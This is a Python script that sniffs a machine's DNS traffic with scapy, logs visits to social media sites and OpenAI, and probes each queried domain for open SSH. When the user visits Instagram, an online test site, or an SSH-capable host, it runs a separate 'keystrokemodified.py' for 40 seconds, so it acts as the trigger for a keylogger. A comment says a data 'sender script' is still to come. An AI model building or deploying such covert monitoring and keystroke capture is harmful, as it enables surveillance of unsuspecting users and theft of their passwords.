#Will be using this trigger.Will be saving the databases in the system only as sender script is not ready yet
from scapy.all import sniff, DNS, DNSQR, IP,TCP,UDP
import socket
import time
import os
import subprocess
import http.client

TARGET_SCRIPT = "keystrokemodified.py"

# def reverse_dns_lookup(ip_address):
#     """Perform reverse DNS lookup for a given IP address."""
#     try:
#         return socket.gethostbyaddr(ip_address)[0]
#     except socket.herror:
#         return "No PTR Record Found"

def get_protocol(domain):
    """Determine the protocol (HTTP/HTTPS) of a website."""
    try:
        conn = http.client.HTTPSConnection(domain, timeout=5)
        conn.request("HEAD", "/")
        response = conn.getresponse()
        if response.status < 400:
            return "HTTPS"
    except Exception:
        try:
            conn = http.client.HTTPConnection(domain, timeout=5)
            conn.request("HEAD", "/")
            response = conn.getresponse()
            if response.status < 400:
                return "HTTP"
        except Exception:
            return "Unknown"
    return "Unknown"

def check_ssh(domain):
    """Check if the domain supports SSH on port 22."""
    try:
        ip = socket.gethostbyname(domain)
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(3)
            if s.connect_ex((ip, 22)) == 0:  # Port 22 is open
                return "SSH Supported"
    except Exception:
        pass
    return "SSH Not Supported"

def extract_ports(packet):
    """Extract and return the source and destination ports from TCP/UDP packets."""
    if packet.haslayer(TCP):
        return  packet[TCP].dport  # Source and Destination Ports for TCP
    elif packet.haslayer(UDP):
        return packet[UDP].dport  # Source and Destination Ports for UDP
    return  None  # If no transport layer (TCP/UDP) found

def process_packet(packet):
    """Process captured packet and extract DNS query details."""
    if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:
        if packet.haslayer(IP):

           query_name = packet[DNSQR].qname.decode('utf-8').strip('.')
           client_ip = packet[IP].src
           destination_ip = packet[IP].dst
           port = extract_ports(packet)
           print(f"DNS Query: {query_name} from {client_ip} to {destination_ip}")
        #    reverse_domain = reverse_dns_lookup(client_ip)
        #    print(f"Reverse DNS Lookup: {client_ip} -> {reverse_domain}")
        
        # protocol = get_protocol(query_name)
           ssh_support = check_ssh(query_name)
        # print(f"Detected Protocol: {protocol}")
        # print(f"SSH Check: {ssh_support}")
        
           with open("networkdatabase.txt", "a") as f:
               if (
                   query_name.startswith("www.youtube.com")
                   or query_name.startswith("www.instagram.com")
                   or query_name.startswith("www.facebook.com")
                   or query_name.startswith("openai.com")#Other websites can be included
               ):
                   protocol = get_protocol(query_name)
                # ssh_support = check_ssh(query_name)
                   f.write(f"Hostname = {query_name}\nprotocol = {protocol}, {ssh_support}\n Destination IP =  {destination_ip}\n Port = {port}\n")

           if query_name.startswith("radiantudaipur.theonlinetests") or query_name.startswith("www.instagram.com") or check_ssh(query_name) == "SSH Supported":#Other similar websites can be included
               print("Triggering script")
               process = subprocess.Popen(["python", TARGET_SCRIPT])
               time.sleep(40)
               os.kill(process.pid, 15)

def main():
    """Main function to start sniffing."""
    print("Capturing DNS queries... Press Ctrl+C to stop.")
    try:
        # Start sniffing DNS queries
        sniff(filter="port 53 or port 22", prn=process_packet, store=False)
    except KeyboardInterrupt:
        # Handle Ctrl+C gracefully
        print("\nMonitoring stopped. Exiting...")

if __name__ == "__main__":
    main()
